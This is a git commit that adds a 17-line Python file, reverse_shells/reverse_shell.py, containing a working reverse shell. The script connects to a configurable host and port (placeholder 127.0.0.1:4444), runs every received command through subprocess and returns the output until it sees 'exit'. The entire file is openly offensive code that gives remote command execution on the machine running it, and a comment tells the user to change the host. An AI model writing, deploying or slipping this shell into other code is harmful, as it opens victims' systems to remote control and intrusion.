61bc3d0f1f43fcae3ebc3434dcae123fae5be5ba
5skr0ll3r <47701859+5skr0ll3r@users.noreply.github.com>
2021-09-01 01:30:00 +0000

    Create reverse_shell.py

---
+++ reverse_shells/reverse_shell.py
@@ -0,0 +1,17 @@
+import socket,subprocess
+
+#Change these if required
+HOST = '127.0.0.1'
+PORT = 4444
+#
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
+s.connect((HOST,PORT))
+
+while True:
+	dat = s.recv(1024)
+	respcom = subprocess.getoutput(dat)
+	if b"exit" in dat:
+		break
+	s.sendall(("=> " + respcom + "\n#: ").encode())
